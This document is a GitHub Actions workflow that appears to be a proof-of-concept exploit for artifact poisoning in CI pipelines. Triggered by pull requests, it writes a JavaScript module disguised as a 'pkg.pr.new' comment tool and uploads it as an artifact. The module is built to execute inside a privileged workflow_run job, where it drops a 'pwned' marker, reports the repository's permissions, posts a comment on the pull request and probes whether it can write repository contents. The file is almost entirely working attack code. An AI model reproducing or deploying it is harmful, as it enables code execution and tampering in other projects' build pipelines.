name: Publish to pkg.pr.new
on:
  pull_request:
    branches: [main]
permissions:
  contents: read
jobs:
  build:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - run: |
          mkdir -p tools
          cat > tools/pkg.pr.new-comment.mjs <<'JS'
          import fs from 'node:fs';
          fs.writeFileSync('pwned-marker.json', JSON.stringify({
            module: 'attacker',
            cwd: process.cwd(),
            repository: process.env.GITHUB_REPOSITORY,
            event: process.env.GITHUB_EVENT_NAME
          }));
          console.log('ATTACKER-MODULE-TOP-LEVEL-RCE', process.cwd());
          export default async function ({ github, context }) {
            const run = context.payload.workflow_run;
            console.log('ATTACKER-WORKFLOW-RUN', JSON.stringify({ id: run.id, event: run.event, conclusion: run.conclusion }));
            const repo = await github.rest.repos.get({ owner: context.repo.owner, repo: context.repo.repo });
            console.log('ATTACKER-PERMS', JSON.stringify(repo.data.permissions), 'private=' + repo.data.private);
            const pr = (run.pull_requests && run.pull_requests[0] && run.pull_requests[0].number) || null;
            console.log('ATTACKER-PR', pr);
            if (pr) {
              const comment = await github.rest.issues.createComment({
                owner: context.repo.owner, repo: context.repo.repo, issue_number: pr,
                body: 'ATTACKER-COMMENT: arbitrary code ran in the privileged workflow_run workflow (validation ' + run.id + ').'
              });
              console.log('ATTACKER-COMMENT-OK', comment.data.id, comment.data.user.login);
            }
            try {
              await github.rest.repos.createOrUpdateFileContents({
                owner: context.repo.owner, repo: context.repo.repo, path: 'attacker-contents-write-probe.txt',
                message: 'probe', content: Buffer.from('probe').toString('base64')
              });
              console.log('ATTACKER-CONTENTS-WRITE-ALLOWED');
            } catch (e) {
              console.log('ATTACKER-CONTENTS-WRITE-BLOCKED', e.status, e.message);
            }
          }
          JS
          echo '{"number":1,"sha":"deadbeef","packages":[]}' > output.json
      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
        with:
          name: output
          path: |
            output.json
            tools/pkg.pr.new-comment.mjs
